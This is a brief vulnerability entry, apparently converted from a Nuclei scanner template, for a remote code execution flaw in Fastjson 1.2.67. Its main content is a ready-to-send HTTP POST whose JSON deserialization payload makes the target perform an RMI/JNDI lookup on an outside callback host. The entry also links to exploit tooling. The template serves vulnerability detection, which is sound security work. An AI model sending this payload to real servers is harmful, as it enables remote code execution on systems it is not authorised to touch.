# Nuclei Template: Fastjson 1.2.67 - Remote Code Execution
**Template ID:** fastjson-1-2-67-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`fastjson-1-2-67-rce.yaml`)

## Vulnerability Information & PoC

## Description
Fastjson 1.2.67 is susceptible to a remote code execution vulnerability.

## Steps to reproduce / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
   "@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig",
   "properties":{
      "@type":"java.util.Properties",
      "UserTransaction":"rmi://{{interactsh-url}}/Exploit"
   }
}
```

## References
- https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
- https://github.com/wyzxxz/fastjson_rce_tool
